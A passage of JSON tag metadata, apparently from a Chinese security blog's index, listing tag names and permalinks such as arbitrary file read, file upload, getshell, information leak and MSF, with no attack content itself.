任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"},{"name":"文件上传","slug":"文件上传","permalink":"https://spaceman-911.gitee.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"},{"name":"信息泄露","slug":"信息泄露","permalink":"https://spaceman-911.gitee.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"name":"MSF","slug":"MSF","permalink":"https://spaceman-911.gitee.io/tags/MSF/"}]}